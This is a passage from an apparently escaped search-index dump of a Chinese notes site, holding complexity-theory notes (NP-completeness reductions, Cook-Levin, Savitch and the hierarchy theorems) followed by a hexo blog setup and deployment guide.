x_1)\\)\uff0c\u6784\u9020\u4e00\u4e2a\u56fe\uff0c\u6709\u4e5d\u4e2a\u8282\u70b9\uff0c\u4e3a\u6bcf\u4e2a\u62ec\u53f7\u4e2d\u7684\u4e09\u4e2a\u53d8\u91cf\u5efa\u7acb\u4e09\u4e2a\u8282\u70b9\uff0c\u5206\u4e3a\u4e09\u7ec4\uff0c\u5728\u7ec4\u4e4b\u95f4\u8fdb\u884c\u8fde\u7ebf\u5efa\u8fb9\uff0c\u6ee1\u8db3\u4e24\u4e2a\u53d8\u91cf\u4e0d\u51b2\u7a81\u7684\u65f6\u5019\u5b58\u5728\u4e00\u6761\u8fb9\uff08e.g. \\(x_1\\) \u548c \\(\\overline{x_1}\\) \u51b2\u7a81\u3002\u6709 \\(m\\) \u4e2a\u62ec\u53f7\uff0c\u5219\u5b9a \\(k=m\\)\uff09\u9009\u4e2d\u7684\u70b9\u5373\u4e3a\u8868\u8fbe\u5f0f\u4e2d\u4e3a\u771f\u7684\u53d8\u91cf\u3002\u53ef\u4ee5\u8bc1\u660e\uff0c\u5982\u679c \\(F\\) \u6709\u89e3\uff0c\u5219 \\(G\\) \u6709\u4e00\u4e2a\u5927\u5c0f\u4e3a \\(k\\) \u7684\u56e2\uff0c\u53cd\u4e4b\u4ea6\u7136\u3002</p> Vertex Cover \u9876\u70b9\u8986\u76d6\u95ee\u9898 <p>\u5bf9\u4e8e\u56fe \\(G=(V, E)\\)\uff0c\u9009\u53d6\u4e00\u4e2a\u70b9\u96c6 \\(V'\\subseteq V\\)\uff0c\u4f7f\u5f97\u5bf9\u4e8e\u4efb\u610f \\(e\\in E\\)\uff0c\\(e\\) \u81f3\u5c11\u6709\u4e00\u4e2a\u7aef\u70b9\u5728 \\(V'\\) \u4e2d\u3002\\(\\mathrm{VC}=\\{\\mathtt{\"}G\\mathtt{\"}\\mathtt{\"}k\\mathtt{\"}: G\\text{ has a vertex cover of size at most }k\\}\\)\u3002\u8981\u8bc1 \\(\\mathrm{3-SAT}\\leq_P\\mathrm{VC}\\)\u3002</p> <p>\u5047\u8bbe \\(F\\) \u6709 \\(n\\) \u4e2a\u53d8\u91cf\uff0c\\(m\\) \u4e2a\u5b50\u53e5\uff0c\u6784\u9020\u56fe\uff0c\u6709 \\(2n+3m\\) \u4e2a\u8282\u70b9\u3002\u5bf9\u4e8e\u6bcf\u4e2a\u53d8\u91cf\uff0c\u5efa\u7acb\u4e24\u4e2a\u70b9 \\(x\\) \u4e0e \\(\\overline{x}\\)\uff0c\u5e76\u5728\u5176\u95f4\u5efa\u7acb\u4e00\u6761\u8fb9\u3002\u518d\u5bf9\u4e8e\u6bcf\u4e2a\u5b50\u53e5\uff0c\u5efa\u7acb\u4e09\u4e2a\u8282\u70b9\uff0c\u4e92\u76f8\u8fde\u63a5\uff0c\u5e76\u5728\u6bcf\u4e2a\u53d8\u91cf\u548c\u521a\u521b\u5efa\u7684 \\(2n\\) \u4e2a\u70b9\u4e2d\u76f8\u540c\u7684\u5efa\u7acb\u4e00\u6761\u8fb9\u3002\u6240\u4ee5\u4e00\u5171\u6709 \\(n+3m+3m\\) \u6761\u8fb9\u3002</p> <ul> <li>\u5b9a\u4e49\u4e00\u4e2a\u8bed\u8a00 \\(L\\) \u662f NP-Complete \u7684\uff0c\u5982\u679c\uff1a<ol> <li>\\(L\\in NP\\)</li> <li>\\(\\forall L'\\in NP, L'\\leq_P L\\)</li> </ol> </li> </ul> Cook-Levin Theorem. SAT is NP-Complete <p>Proof. \u4ee4 \\(A\\) \u662f\u4efb\u610f\u4e00\u4e2a\u5c5e\u4e8e NP \u7684\u8bed\u8a00\u3002\u9700\u8981\u8bc1\u660e \\(A\\leq_P\\mathrm{SAT}\\)\u3002</p> <p>\u5b58\u5728\u4e00\u4e2a NTM \\(N\\) \u5728 \\(n^k\\) \u65f6\u95f4\u5185\u5224\u5b9a \\(A\\)\u3002\u5224\u5b9a \\(a_1\\cdots a_n\\in A\\) \u7b49\u4ef7\u4e8e\u5b58\u5728\u4e00\u4e2a\u5206\u652f \\((s, \\rhd\\underline{\u2334}a_1\\cdots a_n)\\vdash_M(q_1, \\rhd u_1\\underline{a_1}v_1)\\vdash_M\\cdots\\vdash_M(y, \\rhd u\\underline{a}v)\\)\uff0c\u53ef\u4ee5\u5199\u6210 \\(\\rhd\u2334sa_1\\cdots a_n\\vdash_M\\rhd u_1a_1q_1v_1\\vdash_M\\cdots\\vdash_M\\rhd uayv\\)\uff0c\u5176\u4e2d\u6700\u591a\u6709 \\(n^k\\) \u4e2a configurations\uff0c\u5e76\u4e14\u6bcf\u4e2a configuaration \u5bf9\u5e94\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\u6700\u957f \\(n^k\\)\u3002</p> <p>\u5efa\u7acb\u4e00\u4e2a \\(n^k\\times n^k\\) \u7684\u8868\uff0c\u8868\u4e2d\u6bcf\u4e2a\u683c\u5b50\u53ef\u4ee5\u586b\u72b6\u6001\u6216\u8005 symbol\uff0c\u662f\u5426\u5b58\u5728\u8fd9\u6837\u7684\u8f6c\u6362\u5373\u80fd\u5426\u627e\u5230\u4e00\u79cd\u6b63\u786e\u7684\u586b\u8868\u65b9\u5f0f\u3002</p> <ul> <li>\u5bf9\u4e8e \\(1\\leq i\\leq n^k,\\ 1\\leq j\\leq n^k, c\\in K\\cup\\Sigma\\)\uff0c\\(x_{ijc}\\) \u8868\u793a\u8fd9\u4e2a\u4f4d\u7f6e\u4e0a\u662f\u5426\u586b\u4e86 \\(c\\)</li> <li>\u9700\u8981\u6ee1\u8db3\uff1a<ul> <li>\u5bf9\u4e8e\u6bcf\u4e00\u4e2a \\(i, j\\)\uff0c\u8981\u6709 \\(\\displaystyle\\sum_{c\\in k\\cup\\Sigma}x_{ijc}\\geq 1\\)\uff0c\u5373 \\(\\displaystyle\\bigvee_{c\\in K\\cup\\Sigma}x_{ijc}\\) \u4e3a\u771f</li> <li>\u5bf9\u4e8e\u6bcf\u4e00\u4e2a \\(i, j\\)\uff0c\u8981\u4fdd\u8bc1\u4e00\u683c\u5185\u53ea\u80fd\u6709\u4e00\u4e2a\u7b26\u53f7\uff0c\u5373 \\(\\displaystyle\\bigwedge_{c\\neq c'}\\overline{x_{ijc}\\land x_{ijc'}}=\\bigwedge_{c\\neq c'}(\\overline{x_{ijc}}\\lor\\overline{x_{ijc'}})\\) \u4e3a\u771f</li> <li>\\(x_{11\\rhd}\\land x_{12\u2334}\\land x_{13s}\\land \\cdots\\) \u4e3a\u771f\uff08\u89c4\u5b9a\u521d\u59cb\u884c\uff09</li> <li>\u8981\u4fdd\u8bc1\u540e\u4e00\u884c\u662f\u524d\u4e00\u884c\u4e00\u6b65\u64cd\u4f5c\u5230\u7684<ul> <li>\u7528 2*3 \u7684\u6846\u8fdb\u884c\u68c0\u67e5\uff0c\u5408\u6cd5\u7684\u8fd9\u6837\u7684\u6846\u6709 \\(|K\\cup\\Sigma|^6\\) \u79cd</li> </ul> </li> <li>\u5b58\u5728\u63a5\u53d7\u72b6\u6001\uff0c\\(\\displaystyle\\bigvee_{i, j}x_{ijy}\\) \u4e3a\u771f</li> </ul> </li> </ul> Theorem. \u5982\u679c \\(A\\) \u662f NP-Complete \u7684\uff0c\\(B\\in NP, A\\leq_P B\\)\uff0c\u5219 \\(B\\) \u662f NP-Complete \u7684 <p>Proof. \\(\\forall L'\\in NP\\), \\(L\\leq_P A\\)\uff0c\u56e0\u4e3a \\(A\\leq_P B\\)\uff0c\u6240\u4ee5 \\(L\\leq_P B\\)\u3002</p> <ul> <li>SAT\u30013-SAT\u3001CLIQUE\u3001Vertex Cover \u90fd\u662f NP-Complete \u95ee\u9898</li> </ul>"},{"location":"cs/tcs/toc/topic6/#_3","title":"\u7a7a\u95f4\u590d\u6742\u5ea6","text":"<ul> <li>\u4ee4 \\(M\\) \u4e3a\u4e00 DTM\uff0c\u79f0\u5176\u4f7f\u7528 runs in \\(f(n)\\) space \u5982\u679c\u5bf9\u4e8e\u4efb\u4f55\u957f\u5ea6\u4e3a \\(n\\) \u7684\u8f93\u5165\uff0c\\(M\\) \u4f7f\u7528\u7684\u7eb8\u5e26\u7684\u683c\u5b50\u6570\u6700\u591a\u4e3a \\(f(n)\\)<ul> <li>\u5047\u5b9a \\(f(n)\\geq n\\)</li> <li>\u4f7f\u7528\u5355\u5e26\u786e\u5b9a\u6027\u56fe\u7075\u673a\uff08\u786e\u5b9a\u6027\u56fe\u7075\u673a\u53d8\u79cd\u5728\u7a7a\u95f4\u4e0a\u53ea\u5dee\u5e38\u6570\uff09</li> </ul> </li> <li>\u4ee4 \\(M\\) \u4e3a\u4e00 NTM\uff0c\u7c7b\u4f3c DTM\uff0c\u4e0d\u8fc7\u6bcf\u4e2a\u5206\u652f\u90fd\u6700\u591a\u4f7f\u7528 \\(f(n)\\) \u683c\u5b50</li> <li>PSPACE \u95ee\u9898\u4e3a\u53ef\u4ee5\u7531\u786e\u5b9a\u6027\u56fe\u7075\u673a\u5728\u591a\u9879\u5f0f\u7a7a\u95f4\u5185\u89e3\u51b3\u7684\u95ee\u9898\u7684\u96c6\u5408</li> <li>NPSPACE \u95ee\u9898\u4e3a\u53ef\u4ee5\u7531\u975e\u786e\u5b9a\u6027\u56fe\u7075\u673a\u5728\u591a\u9879\u5f0f\u7a7a\u95f4\u5185\u89e3\u51b3\u7684\u95ee\u9898\u7684\u96c6\u5408</li> <li>P \\(\\subseteq\\) PSPACE\uff08\\(f(n)\\) \u65f6\u95f4\u91cc\u53ea\u591f\u8d70 \\(f(n)\\) \u683c\uff09<ul> <li>NP \\(\\subseteq\\) PSPACE\uff08\u7a7a\u95f4\u53ef\u4ee5\u590d\u7528\uff0c\u518d\u9644\u52a0\u591a\u9879\u5f0f\u7a7a\u95f4\u8bb0\u4f4f\u5206\u652f\u7684\u9009\u62e9\u60c5\u51b5\uff09</li> </ul> </li> <li>\u5982\u679c\u4e00\u53f0 DTM \u4f7f\u7528 \\(f(n)\\) \u7a7a\u95f4\u4e14\u5728\u4efb\u610f\u8f93\u5165\u4e0a\u505c\u673a\uff0c\u5219\u5176\u8fd0\u884c\u65f6\u95f4\u6700\u591a \\(|K|\\cdot f(n)\\cdot |\\Sigma|^{f(n)}\\)<ul> <li>configuration \u4e0d\u4f1a\u91cd\u590d\uff08\u4e0d\u7136\u4f1a\u6709\u5faa\u73af\u4e0d\u505c\u673a\uff09</li> <li>\u6709 \\(|K|\\) \u4e2a\u72b6\u6001\uff0c\\(f(n)\\) \u4e2a\u8bfb\u5199\u5934\u4f4d\u7f6e\uff0c\u7eb8\u5e26\u4e0a\u5185\u5bb9 \\(|\\Sigma|^{f(n)}\\)</li> <li>\u662f\u6307\u6570\u65f6\u95f4\u7684</li> </ul> </li> <li>PSPACE \\(\\subseteq\\) EXP<ul> <li>EXP \u4e3a\u53ef\u4ee5\u7531 DTM \u5728\u6307\u6570\u65f6\u95f4\uff08\\(2^{\\mathrm{poly}(n)}\\)\uff09\u5185\u5224\u5b9a\u7684\u95ee\u9898\u7684\u96c6\u5408</li> <li>\u6709 P \\(\\subseteq\\) NP \\(\\subseteq\\) PSPACE \\(\\subseteq\\) EXP</li> </ul> </li> </ul> <p>Theorem. NPSPACE = PSPACE</p> Savitch's Theorem. \u53ef\u4ee5\u88ab NTM \u5728 \\(f(n)\\) \u7a7a\u95f4\u5185\u5224\u5b9a\u7684\u95ee\u9898\u53ef\u4ee5\u88ab DTM \u5728 \\(O(f^2(n))\\) \u7a7a\u95f4\u5185\u5224\u5b9a <p>Proof. \u9012\u5f52\u601d\u8def\u3002\u95ee configuration \u7684\u8f6c\u5316\u80fd\u5426 \\(C_\\text{init}\\rightsquigarrow C_\\text{accept}\\)\uff08\u5176\u4e2d\u6240\u6709 configuration \u90fd\u6700\u591a \\(f(n)\\) \u7a7a\u95f4\uff09\uff0c\u6700\u591a \\(2^{f(n)}\\) \u6b65\u3002</p> <p>\\(C_\\text{init}\\rightsquigarrow C_\\text{accept}\\) \u5f53\u4e14\u4ec5\u5f53\u5b58\u5728 \\(C'\\) \u6709 \\(C_\\text{init}\\rightsquigarrow C'\\) within \\(2^{f(n) - 1}\\) steps\uff0c\u4e14 \\(C'\\rightsquigarrow C_\\text{accept}\\) within \\(2^{f(n) - 1}\\) steps\uff0c\u518d\u8fdb\u884c\u9012\u5f52\u5224\u5b9a\u3002\u867d\u7136\u4e0d\u77e5\u9053 \\(C'\\) \u662f\u4ec0\u4e48\uff0c\u4f46\u9009\u9879\u662f\u6709\u9650\u7684\uff0c\u53ef\u4ee5 \\(2^{f(n)}\\) \u679a\u4e3e\uff08\u65f6\u95f4\u4e0a\u574f\uff0c\u7a7a\u95f4\u4e0a\u53ef\u4ee5\u590d\u7528\uff0c\u6ca1\u95ee\u9898\uff09\u3002</p> <p>\\(Y\\) = on input \\(c_1, c_2, t\\)\uff08\u80fd\u5426\u4ece \\(c_1\\) \u8d70\u5230 \\(c_2\\) \u4e14\u6b65\u6570\u4e0d\u8d85\u8fc7 \\(t\\)\uff09:</p> <ol> <li>if \\(t = 1\\)</li> <li>\u2003\u2003if \\(c_1 = c_2\\) or \\(c_1\\vdash_M c_2\\)</li> <li>\u2003\u2003\u2003\u2003accept</li> <li>\u2003\u2003else</li> <li>\u2003\u2003\u2003\u2003reject</li> <li>for all configurations \\(c'\\) using at most \\(f(n)\\) space</li> <li>\u2003\u2003run \\(Y\\) on \\(c_1, c', t/2\\)</li> <li>\u2003\u2003run \\(Y\\) on \\(c', c_2, t/2\\)</li> <li>\u2003\u2003if both accept</li> <li>\u2003\u2003\u2003\u2003accept</li> <li>\u2003\u2003else</li> <li>\u2003\u2003\u2003\u2003reject</li> </ol> <p>run \\(Y\\) on \\(C_\\text{init}, C_\\text{accept}, 2^{f(n)}\\) \u5373\u53ef\u3002\u7a7a\u95f4\u590d\u6742\u5ea6\uff1a</p> <ul> <li>\\(t=1\\) \u65f6\uff0c\u53ea\u9700\u8981\u5b58 \\(c_1, c_2\\)\uff0c\u5219 \\(s(1) = O(f(n))\\)</li> <li>\u5bf9\u4e8e\u4e00\u822c\u7684 \\(t\\)\uff0c\u9700\u8981 \\(s(t) = O(f(n)) + s(t/2)\\)\uff08\u7b2c\u4e03\u516b\u884c\u7684\u7a7a\u95f4\u53ef\u4ee5\u590d\u7528\uff09<ul> <li>\\(s(t) = O(f(n)\\cdot\\log t)\\)</li> </ul> </li> </ul> <p>\u6700\u7ec8\u6709\u7a7a\u95f4\u590d\u6742\u5ea6\u4e3a \\(O(f(n)\\cdot\\log 2^{f(n)}) = O(f^2(n))\\)\u3002</p> <p>\u7531\u6b64\u5b9a\u7406\u5373\u53ef\u8bf4\u660e PSPACE = NPSPACE\uff0c\u4e14\u53ea\u5dee\u4e00\u4e2a\u5e73\u65b9\u3002</p> <ul> <li>\u524d\u9762\u5df2\u77e5 P \\(\\subseteq\\) NP \\(\\subseteq\\) PSPACE \\(\\subseteq\\) EXP<ul> <li>\u4f46\u662f\u5426\u6709 P \\(\\subsetneq\\) NP \\(\\subsetneq\\) PSPACE \\(\\subsetneq\\) EXP \u90fd\u662f\u672a\u77e5\u7684</li> <li>\u4f46\u5176\u4e2d\u81f3\u5c11\u6709\u4e00\u4e2a\u662f\u771f\u5305\u542b\u7684\uff0c\u53ef\u4ee5\u8bc1\u660e P \\(\\subsetneq\\) EXP</li> </ul> </li> </ul> Hierarchy Theorem. <p>\u7a7a\u95f4\u4e0a\uff0c\u5bf9\u4e8e\u4efb\u610f \\(f\\colon\\mathbb{N}\\to\\mathbb{N}\\)\uff08\u6ee1\u8db3\u4e00\u4e9b\u6027\u8d28\uff09\uff0c\u90fd\u5b58\u5728\u4e00\u4e2a\u8bed\u8a00 \\(A\\) \u6ee1\u8db3\uff1a</p> <ol> <li>\\(A\\) \u53ef\u4ee5\u88ab DTM \u5728 \\(O(f(n))\\) \u7a7a\u95f4\u5185\u5224\u5b9a</li> <li>\\(A\\) \u4e0d\u80fd\u88ab DTM \u5728 \\(o(f(n))\\) \u7a7a\u95f4\u5185\u5224\u5b9a<ul> <li>\u5927 \\(O\\) \u5c0f\u4e8e\u7b49\u4e8e\uff0c\u5c0f \\(o\\) \u5c0f\u4e8e\uff0c\u5373\u81f3\u5c11\u9700\u8981 \\(f(n)\\) \u7a7a\u95f4\uff09</li> </ul> </li> </ol> Proof. space version <p>\u6784\u9020\u4e00\u53f0 DTM \\(D\\)\uff0c\u6ee1\u8db3\u4e24\u4e2a\u6027\u8d28\uff1a</p> <ol> <li>\\(D\\) \u5728 \\(O(f(n))\\) \u7a7a\u95f4\u5185\u53ef\u4ee5\u5224\u5b9a\u67d0\u4e9b\u8bed\u8a00 \\(A\\)</li> <li>\u5bf9\u4e8e\u4efb\u610f\u8fd0\u884c\u5728 \\(o(f(n))\\) \u7a7a\u95f4\u5185\u7684 DTM \\(M\\)\uff0c\\(D\\) \u548c \\(M\\) \u81f3\u5c11\u5728\u4e00\u4e2a\u8f93\u5165\u4e0a\u9762\u7684\u8f93\u51fa\u662f\u4e0d\u4e00\u6837\u7684</li> </ol> <p>\u6784\u9020\u601d\u8def\uff0c\u8fd0\u7528 diagonalization\u3002\u8fd0\u884c\u5728 \\(o(f(n))\\) \u7a7a\u95f4\u4e0a\u7684\u56fe\u7075\u673a\u662f\u53ef\u5217\u7684\uff0c\u5bf9\u6bcf\u4e2a\u56fe\u7075\u673a\u8f93\u5165\u5176\u81ea\u8eab\u7684\u7f16\u7801\uff0c\u7ed3\u679c\u53ef\u80fd\u662f 1\uff08\u63a5\u6536\uff09\u3001-1\uff08\u62d2\u7edd\uff09\u30010\uff08\u4e0d\u505c\u673a\uff09\u3002\u5c31\u53ef\u4ee5\u6784\u9020 \\(D\\)\uff0c\u5c06\u5bf9\u89d2\u7ebf\u6bcf\u4e2a\u4f4d\u7f6e\u53d6\u53cd\u5373\u53ef\uff1a</p> \\(\\mathtt{\"}M_1\\mathtt{\"}\\) \\(\\mathtt{\"}M_2\\mathtt{\"}\\) \\(\\mathtt{\"}M_3\\mathtt{\"}\\) \\(\\cdots\\) \\(M_1\\) 1 \\(M_2\\) -1 \\(M_3\\) 0 \\(\\vdots\\) \\(\\ddots\\) \\(D\\) -1 1 1/-1 \\(\\cdots\\) <p>\\(D\\) = on input \\(\\mathtt{\"}M\\mathtt{\"}\\):</p> <ol> <li>let n = \\(|\\mathtt{\"}M\\mathtt{\"}|\\)</li> <li>compute \\(f(n)\\)\uff08\u524d\u9762\u8bf4\u7684\u8981\u6ee1\u8db3\u7684\u6761\u4ef6\uff1a\\(f(n)\\) \u9700\u8981\u5728 \\(f(n)\\) \u7a7a\u95f4\u5185\u53ef\u8ba1\u7b97\uff0c\u7edd\u5927\u591a\u6570\u51fd\u6570\u90fd\u6ee1\u8db3\uff09</li> <li>run \\(M\\) on \\(\\mathtt{\"}M\\mathtt{\"}\\) for \\(c^{f(n)}\\) steps<ol> <li>if \\(M\\) does not halts in \\(c^{f(n)}\\) steps, reject</li> <li>if \\(M\\) ever uses more than \\(f(n)\\) space, reject</li> </ol> </li> <li>if \\(M\\) accepts \\(\\mathtt{\"}M\\mathtt{\"}\\)</li> <li>\u2003\u2003reject</li> <li>else</li> <li>\u2003\u2003accept</li> </ol> <p>\u65f6\u95f4\u4e0a\uff0c\u5bf9\u4e8e\u4efb\u610f \\(f\\colon\\mathbb{N}\\to\\mathbb{N}\\)\uff08\u6ee1\u8db3\u4e00\u4e9b\u6027\u8d28\uff09\uff0c\u90fd\u5b58\u5728\u4e00\u4e2a\u8bed\u8a00 \\(A\\) \u6ee1\u8db3\uff1a</p> <ol> <li>\\(A\\) \u53ef\u4ee5\u88ab DTM \u5728 \\(O(f(n))\\) \u65f6\u95f4\u5185\u5224\u5b9a</li> <li>\\(A\\) \u4e0d\u80fd\u88ab DTM \u5728 \\(o(\\dfrac{f(n)}{\\log f(n)})\\) \u65f6\u95f4\u5185\u5224\u5b9a<ul> <li>\u65f6\u95f4\u7684 hierarchy theorem \u8981\u5f31\u4e00\u70b9\uff0c\u63d0\u9ad8 \\(\\log f(n)\\) \u624d\u80fd\u591a\u5224\u5b9a\u95ee\u9898</li> </ul> </li> </ol> Proof. time version <p>\u540c\u6837\u9700\u8981\u6784\u9020 \\(D\\) \u6ee1\u8db3\uff1a</p> <ol> <li>\\(D\\) \u5728 \\(O(f(n))\\) \u65f6\u95f4\u5185\u53ef\u4ee5\u5224\u5b9a\u67d0\u4e9b\u8bed\u8a00 \\(A\\)</li> <li>\u5bf9\u4e8e\u4efb\u610f\u8fd0\u884c\u5728 \\(o(\\dfrac{f(n)}{\\log f(n)})\\) \u65f6\u95f4\u5185\u7684 DTM \\(M\\)\uff0c\\(D\\) \u548c \\(M\\) \u81f3\u5c11\u5728\u4e00\u4e2a\u8f93\u5165\u4e0a\u9762\u7684\u8f93\u51fa\u662f\u4e0d\u4e00\u6837\u7684</li> </ol> <p>\\(D\\) = on input \\(\\mathtt{\"}M\\mathtt{\"}\\):</p> <ol> <li>let n = \\(|\\mathtt{\"}M\\mathtt{\"}|\\)</li> <li>compute \\(f(n)\\)\uff08\u9700\u8981\u5728 \\(O(f(n))\\) \u65f6\u95f4\u5185\u53ef\u8ba1\u7b97\uff09</li> <li>run \\(M\\) on \\(\\mathtt{\"}M\\mathtt{\"}\\) for \\(\\dfrac{f(n)}{\\log f(n)}\\) steps<ul> <li>\u8fd9\u91cc\u8981\u9664\u4e00\u4e2a log \u7684\u539f\u56e0\u5728\u4e8e\uff0c\u9700\u8981\u7ef4\u62a4\u4e00\u4e2a counter\uff0c\u4e8c\u8fdb\u5236\u4e32\u6709 \\(\\log_2 f(n)\\) \u4f4d\uff0c\u6bcf\u6b21\u52a0\u4e00\u90fd\u9700\u8981 \\(\\log f(n)\\) \u6b65\uff0c\u4e58\u4ee5\u603b\u6b65\u6570\u540e\u624d\u80fd\u4fdd\u8bc1 \\(f(n)\\) \u6b65</li> </ul> </li> <li>if \\(M\\) accepts \\(\\mathtt{\"}M\\mathtt{\"}\\)</li> <li>\u2003\u2003reject</li> <li>else</li> <li>\u2003\u2003accept</li> </ol> <ul> <li>\u6839\u636e Hierarchy Theorem\uff0c\u6709 P \\(\\subsetneq\\) EXP</li> </ul>"},{"location":"cs/tools/","title":"\u5de5\u5177\u76f8\u5173","text":"<p>Abstract</p> <p>\u4e00\u4e9b\u5de5\u5177\u7684\u7528\u6cd5\u8bb0\u5f55\uff0c\u66f4\u591a\u547d\u4ee4\u3001\u8fd0\u7ef4\u76f8\u5173\u5de5\u5177\u89c1 DevOps &gt; \u7cfb\u7edf\u8fd0\u7ef4</p>"},{"location":"cs/tools/#table-of-contents","title":"Table of Contents","text":"<ul> <li>\u5de5\u5177\u6536\u96c6</li> <li>\u7ad9\u70b9\u751f\u6210\u5de5\u5177<ul> <li>mkdocs \u4f7f\u7528\u8bb0\u5f55</li> <li>hexo \u4f7f\u7528\u8bb0\u5f55</li> <li>sphinx \u4f7f\u7528\u8bb0\u5f55</li> </ul> </li> </ul>"},{"location":"cs/tools/hexo/","title":"hexo \u4f7f\u7528\u8bb0\u5f55","text":"<p> \u7ea6 775 \u4e2a\u5b57  47 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 3 \u5206\u949f</p> <p>Abstract</p> <p>\u5f53\u65f6\u5728\u7528 mkdocs \u642d\u5efa\u4e86\u535a\u5ba2\u4e4b\u540e\u611f\u89c9\u4e0d\u50cf\u4e2a\u535a\u5ba2\u7684\u6837\u5b50\uff0c\u6240\u4ee5\u6362\u4e86 hexo\uff0c\u7528\u6765\u751f\u6210\u535a\u5ba2\u7f51\u7ad9\u8fd8\u662f\u5f88\u65b9\u4fbf\u7684\u3002</p>"},{"location":"cs/tools/hexo/#_1","title":"\u5b89\u88c5","text":"<p>hexo \u57fa\u4e8e node.js\uff0c\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7 <code>npm install -g hexo-cli</code> \u6765\u5b89\u88c5</p>"},{"location":"cs/tools/hexo/#_2","title":"\u4f7f\u7528","text":"<ul> <li>\u521b\u5efa blog \u76ee\u5f55\u653e\u7f6e\u535a\u5ba2\uff1a     <pre><code>$ hexo init blog \n# \u4e5f\u53ef\u4ee5\u624b\u52a8\u521b\u5efa\u76ee\u5f55\u540e\u8fdb\u5165\n$ mkdir blog &amp; cd blog &amp; hexo init \n</code></pre></li> <li>\u5b89\u88c5\u9700\u8981\u7684\u5305\uff1a     <pre><code>$ npm install \n</code></pre></li> <li>\u542f\u52a8\u5185\u7f6e\u9884\u89c8\u670d\u52a1\uff08\u9ed8\u8ba4\u7aef\u53e3 4000\uff09\uff1a     <pre><code>$ hexo s  # hexo serve \n</code></pre></li> <li>\u751f\u6210\u7f51\u7ad9\uff1a     <pre><code>$ hexo g  # hexo generate\n</code></pre>     \u4e4b\u540e\u4f1a\u751f\u6210\u4e00\u4e2a <code>public/</code> \u6587\u4ef6\u5939\uff0c\u4e3a\u7f51\u7ad9\u6e90\u7801</li> </ul> <p>hexo init \u751f\u6210\u7684\u76ee\u5f55\u7ed3\u6784\u4e3a\uff1a <pre><code>\u251c\u2500\u2500 _config.yml   # \u914d\u7f6e\u6587\u4ef6\n\u251c\u2500\u2500 package.json  # \u5e94\u7528\u4fe1\u606f\n\u251c\u2500\u2500 scaffolds/    # \u6a21\u677f\u6587\u4ef6\u5939\n\u251c\u2500\u2500 source/       # \u6e90\u6587\u4ef6\u5939\n|   \u2514\u2500\u2500 _posts/   # \u7a3f\u4ef6\u6587\u4ef6\u5939\n\u2514\u2500\u2500 themes/       # \u4e3b\u9898\u6587\u4ef6\u5939\n</code></pre></p> <p>\u521b\u5efa\u4e00\u7bc7\u65b0\u7684\u6587\u7ae0\u4f7f\u7528 <code>hexo new</code> \u547d\u4ee4\uff0c\u9ed8\u8ba4\u4f1a\u521b\u5efa\u4e00\u7bc7 post\uff0c\u6bd4\u5982 <code>hexo new \"test\"</code> \u4f1a\u5728 <code>source/_post/</code> \u91cc\u4f7f\u7528 <code>scaffolds/post.md</code> \u4e3a\u6a21\u677f\u521b\u5efa\u4e00\u4e2a test.md </p>"},{"location":"cs/tools/hexo/#_3","title":"\u914d\u7f6e","text":"<p><code>_config.yml</code> \u8fd9\u4e2a\u6587\u4ef6\u662f hexo \u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u91cc\u9762\u7684\u5185\u5bb9\uff1a</p> <ul> <li><code>title</code>\uff1a\u7f51\u7ad9\u6807\u9898</li> <li><code>subtitle</code>\uff1a\u526f\u6807\u9898</li> <li><code>description</code>\uff1a\u7f51\u7ad9\u63cf\u8ff0</li> <li><code>keywords</code>\uff1a\u7f51\u7ad9\u5173\u952e\u8bcd</li> <li><code>author</code>\uff1a\u4f5c\u8005</li> <li><code>language</code>\uff1a\u8bed\u8a00</li> <li><code>timezone</code>\uff1a\u65f6\u533a</li> </ul> <p>\u4ee5\u4e0a\u8bbe\u7f6e\u4f1a\u51fa\u73b0\u5728 meta \u91cc</p> <ul> <li><code>url</code>\uff1a\u7f51\u5740</li> <li><code>root</code>\uff1a\u7f51\u7ad9\u6839\u76ee\u5f55</li> <li><code>permalink</code>\uff1a\u6c38\u4e45\u94fe\u63a5\u683c\u5f0f\uff0c\u6bd4\u5982 :year/:month/:day/:title/</li> <li><code>source_dir</code>\uff1a\u6e90\u6587\u4ef6\u5939\uff0c\u9ed8\u8ba4 source</li> <li><code>public_dir</code>\uff1a\u751f\u6210\u7684\u7f51\u7ad9\u6587\u4ef6\u5939</li> <li><code>theme</code>\uff1a\u4e3b\u9898</li> </ul> <p>\u2026\u2026</p> <p>\u6240\u6709\u914d\u7f6e\u8fd8\u662f\u770b\u5b98\u7f51\uff1ahttps://hexo.io/zh-cn/docs/configuration</p>"},{"location":"cs/tools/hexo/#github-pages","title":"\u90e8\u7f72\u5230 GitHub pages","text":"<p>\u914d\u7f6e\u6587\u4ef6\u4e2d\uff1a <pre><code>deploy:\n- type: git\n  repo: https://github.com/.../...\n  branch: master\n</code></pre> \u7136\u540e\u5c31\u53ef\u4ee5\u901a\u8fc7 <code>hexo d</code>\uff08<code>hexo deploy</code>\uff09\u6765\u90e8\u7f72\u5230 GitHub pages \u4e0a\uff08\u6216\u8005 <code>hexo d -g</code> \u751f\u6210\u5e76\u90e8\u7f72\uff09</p>"},{"location":"cs/tools/hexo/#_4","title":"\u4e00\u4e9b\u63d2\u4ef6","text":"<p>\u5b89\u88c5\u63d2\u4ef6\u90fd\u53ef\u4ee5\u901a\u8fc7 <code>npm install ... --save</code> \u6765\u5b89\u88c5</p>"},{"location":"cs/tools/hexo/#hexo-abbrlink","title":"hexo-abbrlink","text":"<p>\u751f\u6210\u4e00\u4e2a\u77ed\u7684\u6c38\u4e45\u94fe\u63a5\uff0c\u5b89\u88c5\u540e\u53ea\u9700\u8981\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u6539\uff1a <pre><code>permalink: p/:abbrlink.html\nabbrlink:\n  alg: crc32\n  rep: hex\n</code></pre> \u5c31\u4f1a\u4e3a\u5229\u7528 crc32 \u4e3a\u6bcf\u7bc7\u6587\u7ae0\u8bbe\u7f6e\u4e00\u4e2a hex \u503c\u7684\u6c38\u4e45\u94fe\u63a5</p>"},{"location":"cs/tools/hexo/#hexo-blog-encrypt","title":"hexo-blog-encrypt","text":"<p>\u53ef\u4ee5\u4e3a\u6587\u7ae0\u52a0\u5bc6\uff0c\u53ea\u9700\u8981\u5728 md \u7684\u6587\u4ef6\u5934\u52a0\u4e0a\uff1a <pre><code>password: ...\n</code></pre> 